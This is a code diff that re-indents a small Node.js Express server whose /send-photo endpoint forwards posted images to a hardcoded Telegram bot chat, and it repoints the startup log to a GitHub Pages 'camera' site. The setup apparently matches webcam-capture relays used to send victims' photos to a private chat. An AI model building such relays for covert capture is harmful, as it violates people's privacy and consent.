@@ -10,19 +10,19 @@ const CHAT_ID = '7086429203'; // Sizning Telegram chat ID
 app.use(bodyParser.json({ limit: '10mb' }));
 
 app.post('/send-photo', async (req, res) => {
-  try {
-    const image = req.body.image;
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      chat_id: CHAT_ID,
-      photo: image
-    });
-    res.sendStatus(200);
-  } catch (err) {
-    console.error('Xatolik:', err.message);
-    res.sendStatus(500);
-  }
+    try {
+        const image = req.body.image;
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            chat_id: CHAT_ID,
+            photo: image
+        });
+        res.sendStatus(200);
+    } catch (err) {
+        console.error('Xatolik:', err.message);
+        res.sendStatus(500);
+    }
 });
 
 app.listen(3000, () => {
-  console.log('✅ Server ishga tushdi: http://localhost:3000');
+    console.log('✅ Server ishga tushdi:  https://abror305.github.io/camera/');
 });
